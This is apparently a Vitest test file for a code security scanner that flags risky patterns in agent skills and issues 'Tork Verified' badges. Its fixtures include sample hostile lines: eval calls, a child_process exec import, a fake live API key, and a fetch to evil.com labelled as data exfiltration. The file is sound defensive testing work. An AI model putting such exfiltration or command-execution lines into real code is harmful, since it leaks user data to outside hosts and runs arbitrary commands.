import { describe, it, expect } from 'vitest';
import { scanFromSource, formatReportForAPI } from '../../dist/scanner/api';
import { generateBadge, generateBadgeMarkdown, generateBadgeJSON } from '../../dist/scanner/badge';
import { SkillScanner } from '../../dist/scanner/index';
import { SCAN_RULES } from '../../dist/scanner/rules';

describe('SkillScanner', () => {
  it('has 14 scan rules', () => {
    expect(SCAN_RULES.length).toBe(14);
  });

  it('rules have required fields', () => {
    for (const rule of SCAN_RULES) {
      expect(rule.id).toBeDefined();
      expect(rule.name).toBeDefined();
      expect(rule.severity).toMatch(/^(critical|high|medium|low)$/);
      expect(rule.pattern).toBeInstanceOf(RegExp);
      expect(rule.description).toBeDefined();
      expect(rule.remediation).toBeDefined();
    }
  });

  it('calculateRiskScore returns 0 for no findings', () => {
    const scanner = new SkillScanner();
    expect(scanner.calculateRiskScore([])).toBe(0);
  });

  it('calculateRiskScore caps at 100', () => {
    const scanner = new SkillScanner();
    const manyFindings = Array(20).fill({
      ruleId: 'SEC-001',
      ruleName: 'test',
      severity: 'critical',
      file: 'test.ts',
      line: 1,
      column: 1,
      snippet: '',
      description: '',
      remediation: '',
    });
    expect(scanner.calculateRiskScore(manyFindings)).toBe(100);
  });
});

describe('scanFromSource', () => {
  it('returns a report with score and verdict', async () => {
    const report = await scanFromSource({ 'index.ts': 'console.log("hello")' }, 'clean-skill');
    expect(report.skillName).toBe('clean-skill');
    expect(report.riskScore).toBeDefined();
    expect(report.verdict).toMatch(/^(verified|reviewed|flagged)$/);
    expect(report.filesScanned).toBeGreaterThanOrEqual(1);
    expect(report.scanDurationMs).toBeGreaterThanOrEqual(0);
  });

  it('detects eval() usage (SEC-001)', async () => {
    const report = await scanFromSource({
      'danger.ts': 'const result = eval("1 + 1");',
    });
    expect(report.totalFindings).toBeGreaterThan(0);
    const evalFinding = report.findings.find((f) => f.ruleId === 'SEC-001');
    expect(evalFinding).toBeDefined();
    expect(evalFinding!.severity).toBe('high');
  });

  it('detects child_process usage (SEC-003)', async () => {
    const report = await scanFromSource({
      'exec.ts': 'const { exec } = require("child_process");',
    });
    const finding = report.findings.find((f) => f.ruleId === 'SEC-003');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('critical');
  });

  it('detects hardcoded secrets (SEC-005)', async () => {
    const report = await scanFromSource({
      'config.ts': 'const api_key = "sk_live_1234567890abcdef1234567890";',
    });
    const finding = report.findings.find((f) => f.ruleId === 'SEC-005');
    expect(finding).toBeDefined();
  });

  it('detects HTTP data exfiltration (SEC-007)', async () => {
    const report = await scanFromSource({
      'leak.ts': 'fetch("https://evil.com/steal")',
    });
    const finding = report.findings.find((f) => f.ruleId === 'SEC-007');
    expect(finding).toBeDefined();
  });

  it('detects server creation (NET-001)', async () => {
    const report = await scanFromSource({
      'server.ts': 'const server = http.createServer((req, res) => {});',
    });
    const finding = report.findings.find((f) => f.ruleId === 'NET-001');
    expect(finding).toBeDefined();
  });

  it('reports clean skill as verified', async () => {
    const report = await scanFromSource({
      'index.ts': 'export function add(a: number, b: number) { return a + b; }',
    });
    expect(report.verdict).toBe('verified');
    expect(report.riskScore).toBeLessThan(30);
  });
});

describe('formatReportForAPI', () => {
  it('strips file paths from findings', async () => {
    const report = await scanFromSource({
      'danger.ts': 'const x = eval("code");',
    });
    const apiReport = formatReportForAPI(report);

    expect(apiReport.skillName).toBe(report.skillName);
    expect(apiReport.riskScore).toBe(report.riskScore);
    expect(apiReport.findings.length).toBe(report.totalFindings);

    // API findings should NOT have a 'file' property
    for (const finding of apiReport.findings) {
      expect(finding).not.toHaveProperty('file');
      expect(finding.ruleId).toBeDefined();
      expect(finding.line).toBeDefined();
    }
  });
});

describe('generateBadge', () => {
  it('returns verified badge for low-risk report', async () => {
    const report = await scanFromSource({
      'clean.ts': 'export const x = 1;',
    });
    const badge = generateBadge(report);
    expect(badge.tier).toBe('verified');
    expect(badge.color).toBe('#22c55e');
    expect(badge.label).toBe('Tork Verified');
    expect(badge.riskScore).toBe(report.riskScore);
    expect(badge.verifyUrl).toContain('tork.network/verify');
  });

  it('returns flagged badge for high-risk report', async () => {
    const report = await scanFromSource({
      'evil.ts': [
        'eval("malicious")',
        'const { exec } = require("child_process")',
        'const api_key = "sk_live_1234567890abcdef1234567890"',
        'fetch("https://evil.com/steal")',
      ].join('\n'),
    });
    const badge = generateBadge(report);
    expect(badge.tier).toBe('flagged');
    expect(badge.color).toBe('#ef4444');
  });

  it('generateBadgeMarkdown returns shields.io markdown', () => {
    const badge = {
      tier: 'verified' as const,
      color: '#22c55e',
      label: 'Tork Verified',
      riskScore: 0,
      scannedAt: '2026-01-01',
      verifyUrl: 'https://tork.network/verify/test',
    };
    const md = generateBadgeMarkdown(badge);
    expect(md).toContain('img.shields.io');
    expect(md).toContain('Tork');
    expect(md).toContain('tork.network/verify');
  });

  it('generateBadgeJSON returns valid JSON', () => {
    const badge = {
      tier: 'verified' as const,
      color: '#22c55e',
      label: 'Tork Verified',
      riskScore: 0,
      scannedAt: '2026-01-01',
      verifyUrl: 'https://tork.network/verify/test',
    };
    const json = generateBadgeJSON(badge);
    const parsed = JSON.parse(json);
    expect(parsed.tier).toBe('verified');
  });
});
